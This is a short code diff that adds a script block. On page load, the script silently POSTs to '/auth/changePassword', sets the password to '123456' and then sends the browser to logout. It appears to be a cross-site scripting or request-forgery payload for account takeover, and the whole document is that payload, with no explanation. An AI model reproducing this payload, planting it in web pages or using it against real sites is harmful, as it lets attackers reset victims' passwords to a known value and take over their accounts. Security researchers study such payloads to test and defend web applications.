@@ -1,0 +1,13 @@
+<script>
+    $(document).ready(function() {
+        $.post('/auth/changePassword',
+                {
+                    password: "123456",
+                    confirm: "123456",
+                },
+                function (data) {
+                    window.location.href = '/auth/logout';
+                }
+        );
+    });
+</script>
